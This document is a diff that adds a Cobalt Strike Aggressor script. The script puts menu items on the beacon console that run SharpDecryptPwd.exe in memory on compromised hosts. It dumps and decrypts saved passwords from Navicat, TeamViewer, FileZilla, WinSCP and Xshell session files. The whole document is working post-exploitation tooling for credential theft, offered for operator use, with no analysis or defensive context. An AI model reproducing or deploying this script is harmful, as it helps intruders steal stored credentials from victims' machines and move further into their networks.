@@ -1,0 +1,34 @@
+sub SharpDecryptPwd {
+	
+		bexecute_assembly($bid, script_resource("modules/SharpDecryptPwd.exe"), $3['type']);
+	
+}
+sub DecryptXShell {
+		$arg = join(' ', @($3['type'],"-p",$3['path']));
+		bexecute_assembly($bid, script_resource("modules/SharpDecryptPwd.exe"), $arg);
+}
+
+popup beacon_bottom {
+    menu "DecryptPwd" {
+        
+		item "DecryptPwd" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
+			drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla", "-WinSCP"));
+            dbutton_action($dialog, "Chong!!!");
+			dialog_show($dialog);
+        }
+	item "DecryptXShell" {
+			$bid = $1['@'];
+			$dialog = dialog("DecryptXShell", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &DecryptXShell);
+			dialog_description($dialog, "DecryptXShell");
+			drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
+			drow_text($dialog, "path", "Sessions Path:  ");
+            dbutton_action($dialog, "Chong!!!");
+			dialog_show($dialog);
+        }
+		
+    }
+}
+
+
